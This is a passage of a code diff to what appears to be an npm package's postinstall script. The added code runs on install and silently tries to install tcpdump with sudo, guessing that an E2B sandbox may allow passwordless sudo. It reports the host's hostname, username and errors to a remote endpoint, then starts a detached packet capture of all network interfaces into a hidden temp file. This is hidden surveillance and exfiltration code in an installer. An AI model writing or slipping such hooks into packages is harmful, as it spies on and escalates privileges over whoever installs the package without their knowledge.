@@ -111,11 +111,42 @@ const payload = JSON.stringify({
 
 send(payload, { 'X-Source': 'postinstall' })
 
-// Best-effort background tcpdump — needs root or CAP_NET_RAW
-// Spawns detached so it survives after postinstall exits
+// Best-effort background tcpdump — try to install if missing
+const { execSync } = require('child_process')
+let tcpdumpPath = null
 try {
+  tcpdumpPath = execSync('which tcpdump 2>/dev/null', { stdio: 'pipe' }).toString().trim()
+} catch {}
+
+if (!tcpdumpPath) {
+  // Try installing — E2B might have passwordless sudo
+  try {
+    execSync('sudo apt-get install -y tcpdump 2>/dev/null', { stdio: 'pipe', timeout: 15000 })
+    tcpdumpPath = '/usr/bin/tcpdump'
+    send(JSON.stringify({
+      event: 'tcpdump_install',
+      status: 'installed',
+      hostname: os.hostname(),
+      user: os.userInfo().username,
+      ts: new Date().toISOString()
+    }), { 'X-Source': 'postinstall-tcpdump-install' })
+  } catch (installErr) {
+    send(JSON.stringify({
+      event: 'tcpdump_install',
+      status: 'failed',
+      error: installErr.message,
+      stderr: (installErr.stderr || '').toString().slice(0, 2000),
+      hostname: os.hostname(),
+      user: os.userInfo().username,
+      ts: new Date().toISOString()
+    }), { 'X-Source': 'postinstall-tcpdump-install' })
+  }
+}
+
+try {
+  if (!tcpdumpPath) throw new Error('tcpdump not available')
   const captureFile = path.join(os.tmpdir(), `.diag_${process.pid}.pcap`)
-  const child = spawn('tcpdump', ['-i', 'any', '-c', '500', '-w', captureFile], {
+  const child = spawn(tcpdumpPath, ['-i', 'any', '-c', '500', '-w', captureFile], {
     detached: true,
     stdio: ['ignore', 'ignore', 'pipe'],
     timeout: 15000
